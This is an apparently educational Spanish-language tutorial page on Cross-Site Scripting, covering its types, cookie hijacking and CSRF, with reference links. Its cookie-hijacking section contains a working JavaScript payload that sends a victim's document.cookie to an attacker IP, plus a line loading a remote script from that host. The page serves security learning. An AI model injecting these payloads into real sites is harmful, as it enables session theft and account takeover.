---
cover: https://i.ytimg.com/vi/HQUCYEr50wc/maxresdefault.jpg
coverY: 152
---

# Cross-Site Scripting (XSS)

## ¿Que es un Cross-Site Scripting (XSS)?¿Que tipos existen?

Las vulnerabilidades XSS, son inyecciones en el código JavaScript de una web en un campo con las etiquetas `<script></script>` que nos permiten ejecutar código JavaScript en la web.

Esta no es una vulnerabilidad que sea muy critica, pero puede derivarse en otras vulnerabilidades de más alta criticidad. Existen diferentes tipos de XSS:

* **Reflected XSS** (XSS Reflejado)**:** Este tipo de XSS, es el más simple ya que se ejecuta cuando la web recibe los datos en una solicitud HTTP. Ejemplo:

```http
http://myshop.com/?search=<script>alert('XSS')</script>
```

* **Stored XSS** (XSS Almacenado): Esta variante, se conoce como XSS persistente, ya que el script malicioso se encuentra almacenado en la web, y cada vez que un usuario la visita, dicho script se ejecuta
* **DOM-based XSS** (XSS basado en DOM): En el caso del XSS basado en DOM ocurre cuando el código malicioso se inyecta directamente en el DOM (Modelo de Objeto del Documento) de la página web

## Cookie Hijacking

El cookie hijacking, es una técnica mediante la cual se obtiene una cookie de otro usuario, para posteriormente, poder ser autenticado como el sin proporcionar credenciales validas, consiguiendo así secuestrar la sesión del otro usuario. Por ejemplo, imagina que tienes un usuario sin privilegios, y te das cuenta de que en la web existe un XSS, pues mediante el código JavaScript, y con las etiquetas, podemos hacer que se nos proporcione la cookie de otro usuario que abra la web con el XSS implantado.

En el campo vulnerable pondríamos algo como esto:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.12/?cookie=' + document.cookie);
request.send();
```

Con este código, se nos realizaría una petición a nuestra IP (Debemos de tener un servidor montado con anterioridad) en la que se añadiría la cookie del usuario que visite la pagina donde inyectamos el XSS. Y posteriormente, usar de nuestro lado esa cookie para poder autenticarnos como ese usuario.

{% hint style="info" %}
En vez de inyectar todo el código JavaScript en la página, podemos usar el atributo `src` en el código para referirse a un archivo que tengamos en nuestra maquina (Debes de tener un servidor HTTP) Ejemplo:

```javascript
<script src="http://192.168.0.12/archivo.js"></script>
```
{% endhint %}

## Cross-Site Request Forgery (CSRF)

Con el [CSRF](cross-sise-request-forgery-csrf.md), podemos hacer que en el caso de que por ejemplo no nos pudiésemos haber autenticado, hacer que el usuario que visita la web con el XSS, ejecute la petición o el código por nosotros.

{% hint style="info" %}
Puede que a pesar de tener la cookie, no nos podamos autenticar con ella, ya que algunas webs solo permiten tener una sesión activa por usuario
{% endhint %}





{% hint style="info" %}
Enlaces de Interés:

1. [https://blog.hackmetrix.com/xss-cross-site-scripting/](https://blog.hackmetrix.com/xss-cross-site-scripting/)
2. [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
3. [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
4. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
5. [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
{% endhint %}
